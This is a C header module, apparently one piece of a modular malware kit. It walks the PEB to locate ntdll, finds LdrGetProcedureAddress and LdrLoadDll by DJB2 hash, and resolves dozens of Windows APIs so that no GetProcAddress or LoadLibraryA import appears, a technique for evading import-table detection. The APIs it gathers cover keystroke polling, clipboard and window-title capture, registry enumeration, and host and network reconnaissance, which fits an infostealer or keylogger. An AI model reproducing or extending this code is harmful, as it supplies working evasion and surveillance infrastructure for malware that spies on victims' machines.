// chunk: api_resolve/ldr_get_proc
// depends: (none)
// provides: ldr_resolve, api, resolve_all_apis
// headers: windows.h,winternl.h
// note: LdrGetProcedureAddress-based resolution — walks PEB for ntdll, uses Ldr* APIs for all resolution; zero GetProcAddress/LoadLibraryA in IAT

#ifndef CHUNK_LDR_GET_PROC
#define CHUNK_LDR_GET_PROC

#include <windows.h>
#include <winternl.h>

/* DJB2 hashes for PEB module/export walking */
static DWORD ldr_djb2(const char *s) {
    DWORD h = 5381;
    while (*s) h = ((h << 5) + h) + *s++;
    return h;
}

static DWORD ldr_djb2_w(const WCHAR *s) {
    DWORD h = 5381;
    while (*s) {
        char c = (char)(*s > 127 ? '?' : *s);
        if (c >= 'A' && c <= 'Z') c += 32;
        h = ((h << 5) + h) + c;
        s++;
    }
    return h;
}

static HMODULE ldr_find_module(DWORD name_hash) {
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
#else
    PEB *peb = (PEB *)__readfsdword(0x30);
#endif
    PEB_LDR_DATA *ldr = peb->Ldr;
    LIST_ENTRY *head = &ldr->InMemoryOrderModuleList;
    LIST_ENTRY *cur = head->Flink;

    while (cur != head) {
        LDR_DATA_TABLE_ENTRY *entry = CONTAINING_RECORD(cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->FullDllName.Buffer) {
            WCHAR *name = entry->FullDllName.Buffer;
            WCHAR *slash = name;
            for (WCHAR *p = name; *p; p++)
                if (*p == '\\' || *p == '/') slash = p + 1;
            if (ldr_djb2_w(slash) == name_hash)
                return (HMODULE)entry->DllBase;
        }
        cur = cur->Flink;
    }
    return NULL;
}

static FARPROC ldr_find_export(HMODULE mod, DWORD func_hash) {
    BYTE *base = (BYTE *)mod;
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    IMAGE_NT_HEADERS *nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;

    DWORD exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva) return NULL;
    IMAGE_EXPORT_DIRECTORY *exp = (IMAGE_EXPORT_DIRECTORY *)(base + exp_rva);

    DWORD *names = (DWORD *)(base + exp->AddressOfNames);
    WORD *ords = (WORD *)(base + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *fn_name = (char *)(base + names[i]);
        if (ldr_djb2(fn_name) == func_hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return NULL;
}

/* ntdll Ldr* function typedefs */
typedef NTSTATUS (NTAPI *fn_LdrGetProcedureAddress)(
    HMODULE ModuleHandle, PANSI_STRING FunctionName, WORD Ordinal, PVOID *FunctionAddress);
typedef NTSTATUS (NTAPI *fn_LdrLoadDll)(
    PWSTR SearchPath, PULONG DllCharacteristics, PUNICODE_STRING DllName, PVOID *BaseAddress);

/* Helper: build ANSI_STRING on stack and call LdrGetProcedureAddress */
static FARPROC ldr_resolve(fn_LdrGetProcedureAddress pLdrGetProc, HMODULE mod, const char *name) {
    ANSI_STRING as;
    as.Buffer = (PCHAR)name;
    as.Length = 0;
    while (name[as.Length]) as.Length++;
    as.MaximumLength = as.Length + 1;

    PVOID addr = NULL;
    NTSTATUS st = pLdrGetProc(mod, &as, 0, &addr);
    return (st >= 0) ? (FARPROC)addr : NULL;
}

/* Helper: build UNICODE_STRING on stack and call LdrLoadDll */
static HMODULE ldr_load(fn_LdrLoadDll pLdrLoad, const WCHAR *name) {
    UNICODE_STRING us;
    us.Buffer = (PWSTR)name;
    us.Length = 0;
    while (name[us.Length]) us.Length++;
    us.Length *= sizeof(WCHAR);
    us.MaximumLength = us.Length + sizeof(WCHAR);

    PVOID base = NULL;
    NTSTATUS st = pLdrLoad(NULL, NULL, &us, &base);
    return (st >= 0) ? (HMODULE)base : NULL;
}

/* kernel32 */
typedef HANDLE (WINAPI *fn_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL   (WINAPI *fn_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_WriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL   (WINAPI *fn_CloseHandle)(HANDLE);
typedef BOOL   (WINAPI *fn_CreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef BOOL   (WINAPI *fn_CopyFileA)(LPCSTR, LPCSTR, BOOL);
typedef DWORD  (WINAPI *fn_GetFileAttributesA)(LPCSTR);
typedef BOOL   (WINAPI *fn_DeleteFileA)(LPCSTR);
typedef BOOL   (WINAPI *fn_CreatePipe)(PHANDLE, PHANDLE, LPSECURITY_ATTRIBUTES, DWORD);
typedef DWORD  (WINAPI *fn_WaitForSingleObject)(HANDLE, DWORD);
typedef DWORD  (WINAPI *fn_GetFileSize)(HANDLE, LPDWORD);
typedef DWORD  (WINAPI *fn_GetTempPathA)(DWORD, LPSTR);
typedef BOOL   (WINAPI *fn_GetComputerNameA)(LPSTR, LPDWORD);
typedef void   (WINAPI *fn_Sleep)(DWORD);
typedef DWORD  (WINAPI *fn_GetTickCount)(void);
typedef LPVOID (WINAPI *fn_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef HANDLE (WINAPI *fn_FindFirstFileA)(LPCSTR, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *fn_FindNextFileA)(HANDLE, LPWIN32_FIND_DATAA);
typedef BOOL   (WINAPI *fn_FindClose)(HANDLE);
typedef BOOL   (WINAPI *fn_CreateDirectoryA)(LPCSTR, LPSECURITY_ATTRIBUTES);
typedef DWORD  (WINAPI *fn_GetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
typedef void   (WINAPI *fn_GetNativeSystemInfo)(LPSYSTEM_INFO);
typedef BOOL   (WINAPI *fn_GetDiskFreeSpaceExA)(LPCSTR, PULARGE_INTEGER, PULARGE_INTEGER, PULARGE_INTEGER);
typedef DWORD  (WINAPI *fn_GetLogicalDriveStringsA)(DWORD, LPSTR);
typedef UINT   (WINAPI *fn_GetDriveTypeA)(LPCSTR);
typedef void   (WINAPI *fn_GetLocalTime)(LPSYSTEMTIME);
typedef int    (WINAPI *fn_MultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
typedef int    (WINAPI *fn_WideCharToMultiByte)(UINT, DWORD, LPCWSTR, int, LPSTR, int, LPCSTR, LPBOOL);
typedef HMODULE(WINAPI *fn_GetModuleHandleA)(LPCSTR);
typedef DWORD  (WINAPI *fn_GetLastError)(void);
/* advapi32 */
typedef BOOL   (WINAPI *fn_GetUserNameA)(LPSTR, LPDWORD);
typedef LONG   (WINAPI *fn_RegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG   (WINAPI *fn_RegQueryValueExA)(HKEY, LPCSTR, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG   (WINAPI *fn_RegEnumValueA)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPDWORD, LPBYTE, LPDWORD);
typedef LONG   (WINAPI *fn_RegEnumKeyExA)(HKEY, DWORD, LPSTR, LPDWORD, LPDWORD, LPSTR, LPDWORD, PFILETIME);
typedef LONG   (WINAPI *fn_RegCloseKey)(HKEY);
/* user32 */
typedef BOOL   (WINAPI *fn_EnumWindows)(WNDENUMPROC, LPARAM);
typedef int    (WINAPI *fn_GetWindowTextA)(HWND, LPSTR, int);
typedef BOOL   (WINAPI *fn_OpenClipboard)(HWND);
typedef HANDLE (WINAPI *fn_GetClipboardData)(UINT);
typedef BOOL   (WINAPI *fn_CloseClipboard)(void);
typedef HWND   (WINAPI *fn_GetForegroundWindow)(void);
typedef SHORT  (WINAPI *fn_GetAsyncKeyState)(int);
typedef void   (WINAPI *fn_keybd_event)(BYTE, BYTE, DWORD, ULONG_PTR);
/* shell32 */
typedef HRESULT(WINAPI *fn_SHGetFolderPathA)(HWND, int, HANDLE, DWORD, LPSTR);
/* iphlpapi */
typedef ULONG  (WINAPI *fn_GetAdaptersInfo)(/*PIP_ADAPTER_INFO*/void*, PULONG);
typedef DWORD  (WINAPI *fn_GetExtendedTcpTable)(PVOID, PDWORD, BOOL, ULONG, /*TCP_TABLE_CLASS*/int, ULONG);

static struct {
    /* kernel32 */
    fn_CreateFileA       pCreateFileA;
    fn_ReadFile          pReadFile;
    fn_WriteFile         pWriteFile;
    fn_CloseHandle       pCloseHandle;
    fn_CreateProcessA    pCreateProcessA;
    fn_CopyFileA         pCopyFileA;
    fn_GetFileAttributesA pGetFileAttributesA;
    fn_DeleteFileA       pDeleteFileA;
    fn_CreatePipe        pCreatePipe;
    fn_WaitForSingleObject pWaitForSingleObject;
    fn_GetFileSize       pGetFileSize;
    fn_GetTempPathA      pGetTempPathA;
    fn_GetComputerNameA  pGetComputerNameA;
    fn_Sleep             pSleep;
    fn_GetTickCount      pGetTickCount;
    fn_VirtualAlloc      pVirtualAlloc;
    fn_FindFirstFileA    pFindFirstFileA;
    fn_FindNextFileA     pFindNextFileA;
    fn_FindClose         pFindClose;
    fn_CreateDirectoryA  pCreateDirectoryA;
    fn_GetEnvironmentVariableA pGetEnvironmentVariableA;
    fn_GetNativeSystemInfo pGetNativeSystemInfo;
    fn_GetDiskFreeSpaceExA pGetDiskFreeSpaceExA;
    fn_GetLogicalDriveStringsA pGetLogicalDriveStringsA;
    fn_GetDriveTypeA     pGetDriveTypeA;
    fn_GetLocalTime      pGetLocalTime;
    fn_MultiByteToWideChar pMultiByteToWideChar;
    fn_WideCharToMultiByte pWideCharToMultiByte;
    fn_GetModuleHandleA  pGetModuleHandleA;
    fn_GetLastError      pGetLastError;
    /* advapi32 */
    fn_GetUserNameA      pGetUserNameA;
    fn_RegOpenKeyExA     pRegOpenKeyExA;
    fn_RegQueryValueExA  pRegQueryValueExA;
    fn_RegEnumValueA     pRegEnumValueA;
    fn_RegEnumKeyExA     pRegEnumKeyExA;
    fn_RegCloseKey       pRegCloseKey;
    /* user32 */
    fn_EnumWindows       pEnumWindows;
    fn_GetWindowTextA    pGetWindowTextA;
    fn_OpenClipboard     pOpenClipboard;
    fn_GetClipboardData  pGetClipboardData;
    fn_CloseClipboard    pCloseClipboard;
    fn_GetForegroundWindow pGetForegroundWindow;
    fn_GetAsyncKeyState pGetAsyncKeyState;
    fn_keybd_event     pkeybd_event;
    /* shell32 */
    fn_SHGetFolderPathA  pSHGetFolderPathA;
    /* iphlpapi */
    fn_GetAdaptersInfo   pGetAdaptersInfo;
    fn_GetExtendedTcpTable pGetExtendedTcpTable;
} api = {0};

static int resolve_all_apis(void) {
    /* Step 1: Walk PEB to find ntdll.dll */
    HMODULE ntdll = ldr_find_module(0x22d3b5ed);  /* ntdll.dll */
    if (!ntdll) return 0;

    /* Step 2: Get LdrGetProcedureAddress and LdrLoadDll from ntdll exports */
    fn_LdrGetProcedureAddress pLdrGetProc = (fn_LdrGetProcedureAddress)
        ldr_find_export(ntdll, 0x2e5a99f6);  /* LdrGetProcedureAddress */
    fn_LdrLoadDll pLdrLoad = (fn_LdrLoadDll)
        ldr_find_export(ntdll, 0x0307db23);  /* LdrLoadDll */
    if (!pLdrGetProc || !pLdrLoad) return 0;

    /* Step 3: Load DLLs via LdrLoadDll — no LoadLibraryA in IAT */
    HMODULE k32   = ldr_load(pLdrLoad, L"kernel32.dll");
    HMODULE adv   = ldr_load(pLdrLoad, L"advapi32.dll");
    HMODULE u32   = ldr_load(pLdrLoad, L"user32.dll");
    HMODULE sh32  = ldr_load(pLdrLoad, L"shell32.dll");
    HMODULE iphlp = ldr_load(pLdrLoad, L"iphlpapi.dll");
    if (!k32) return 0;

    /* Step 4: Resolve all APIs via LdrGetProcedureAddress — no GetProcAddress in IAT */

    /* kernel32 */
    api.pCreateFileA       = (fn_CreateFileA)ldr_resolve(pLdrGetProc, k32, "CreateFileA");
    api.pReadFile          = (fn_ReadFile)ldr_resolve(pLdrGetProc, k32, "ReadFile");
    api.pWriteFile         = (fn_WriteFile)ldr_resolve(pLdrGetProc, k32, "WriteFile");
    api.pCloseHandle       = (fn_CloseHandle)ldr_resolve(pLdrGetProc, k32, "CloseHandle");
    api.pCreateProcessA    = (fn_CreateProcessA)ldr_resolve(pLdrGetProc, k32, "CreateProcessA");
    api.pCopyFileA         = (fn_CopyFileA)ldr_resolve(pLdrGetProc, k32, "CopyFileA");
    api.pGetFileAttributesA = (fn_GetFileAttributesA)ldr_resolve(pLdrGetProc, k32, "GetFileAttributesA");
    api.pDeleteFileA       = (fn_DeleteFileA)ldr_resolve(pLdrGetProc, k32, "DeleteFileA");
    api.pCreatePipe        = (fn_CreatePipe)ldr_resolve(pLdrGetProc, k32, "CreatePipe");
    api.pWaitForSingleObject = (fn_WaitForSingleObject)ldr_resolve(pLdrGetProc, k32, "WaitForSingleObject");
    api.pGetFileSize       = (fn_GetFileSize)ldr_resolve(pLdrGetProc, k32, "GetFileSize");
    api.pGetTempPathA      = (fn_GetTempPathA)ldr_resolve(pLdrGetProc, k32, "GetTempPathA");
    api.pGetComputerNameA  = (fn_GetComputerNameA)ldr_resolve(pLdrGetProc, k32, "GetComputerNameA");
    api.pSleep             = (fn_Sleep)ldr_resolve(pLdrGetProc, k32, "Sleep");
    api.pGetTickCount      = (fn_GetTickCount)ldr_resolve(pLdrGetProc, k32, "GetTickCount");
    api.pVirtualAlloc      = (fn_VirtualAlloc)ldr_resolve(pLdrGetProc, k32, "VirtualAlloc");
    api.pFindFirstFileA    = (fn_FindFirstFileA)ldr_resolve(pLdrGetProc, k32, "FindFirstFileA");
    api.pFindNextFileA     = (fn_FindNextFileA)ldr_resolve(pLdrGetProc, k32, "FindNextFileA");
    api.pFindClose         = (fn_FindClose)ldr_resolve(pLdrGetProc, k32, "FindClose");
    api.pCreateDirectoryA  = (fn_CreateDirectoryA)ldr_resolve(pLdrGetProc, k32, "CreateDirectoryA");
    api.pGetEnvironmentVariableA = (fn_GetEnvironmentVariableA)ldr_resolve(pLdrGetProc, k32, "GetEnvironmentVariableA");
    api.pGetNativeSystemInfo = (fn_GetNativeSystemInfo)ldr_resolve(pLdrGetProc, k32, "GetNativeSystemInfo");
    api.pGetDiskFreeSpaceExA = (fn_GetDiskFreeSpaceExA)ldr_resolve(pLdrGetProc, k32, "GetDiskFreeSpaceExA");
    api.pGetLogicalDriveStringsA = (fn_GetLogicalDriveStringsA)ldr_resolve(pLdrGetProc, k32, "GetLogicalDriveStringsA");
    api.pGetDriveTypeA     = (fn_GetDriveTypeA)ldr_resolve(pLdrGetProc, k32, "GetDriveTypeA");
    api.pGetLocalTime      = (fn_GetLocalTime)ldr_resolve(pLdrGetProc, k32, "GetLocalTime");
    api.pMultiByteToWideChar = (fn_MultiByteToWideChar)ldr_resolve(pLdrGetProc, k32, "MultiByteToWideChar");
    api.pWideCharToMultiByte = (fn_WideCharToMultiByte)ldr_resolve(pLdrGetProc, k32, "WideCharToMultiByte");
    api.pGetModuleHandleA  = (fn_GetModuleHandleA)ldr_resolve(pLdrGetProc, k32, "GetModuleHandleA");
    api.pGetLastError      = (fn_GetLastError)ldr_resolve(pLdrGetProc, k32, "GetLastError");

    /* advapi32 */
    if (adv) {
        api.pGetUserNameA      = (fn_GetUserNameA)ldr_resolve(pLdrGetProc, adv, "GetUserNameA");
        api.pRegOpenKeyExA     = (fn_RegOpenKeyExA)ldr_resolve(pLdrGetProc, adv, "RegOpenKeyExA");
        api.pRegQueryValueExA  = (fn_RegQueryValueExA)ldr_resolve(pLdrGetProc, adv, "RegQueryValueExA");
        api.pRegEnumValueA     = (fn_RegEnumValueA)ldr_resolve(pLdrGetProc, adv, "RegEnumValueA");
        api.pRegEnumKeyExA     = (fn_RegEnumKeyExA)ldr_resolve(pLdrGetProc, adv, "RegEnumKeyExA");
        api.pRegCloseKey       = (fn_RegCloseKey)ldr_resolve(pLdrGetProc, adv, "RegCloseKey");
    }

    /* user32 */
    if (u32) {
        api.pEnumWindows       = (fn_EnumWindows)ldr_resolve(pLdrGetProc, u32, "EnumWindows");
        api.pGetWindowTextA    = (fn_GetWindowTextA)ldr_resolve(pLdrGetProc, u32, "GetWindowTextA");
        api.pOpenClipboard     = (fn_OpenClipboard)ldr_resolve(pLdrGetProc, u32, "OpenClipboard");
        api.pGetClipboardData  = (fn_GetClipboardData)ldr_resolve(pLdrGetProc, u32, "GetClipboardData");
        api.pCloseClipboard    = (fn_CloseClipboard)ldr_resolve(pLdrGetProc, u32, "CloseClipboard");
        api.pGetForegroundWindow = (fn_GetForegroundWindow)ldr_resolve(pLdrGetProc, u32, "GetForegroundWindow");
        api.pGetAsyncKeyState  = (fn_GetAsyncKeyState)ldr_resolve(pLdrGetProc, u32, "GetAsyncKeyState");
        api.pkeybd_event       = (fn_keybd_event)ldr_resolve(pLdrGetProc, u32, "keybd_event");
    }

    /* shell32 */
    if (sh32) {
        api.pSHGetFolderPathA  = (fn_SHGetFolderPathA)ldr_resolve(pLdrGetProc, sh32, "SHGetFolderPathA");
    }

    /* iphlpapi */
    if (iphlp) {
        api.pGetAdaptersInfo   = (fn_GetAdaptersInfo)ldr_resolve(pLdrGetProc, iphlp, "GetAdaptersInfo");
        api.pGetExtendedTcpTable = (fn_GetExtendedTcpTable)ldr_resolve(pLdrGetProc, iphlp, "GetExtendedTcpTable");
    }

    return (api.pCreateFileA != NULL);
}

#endif
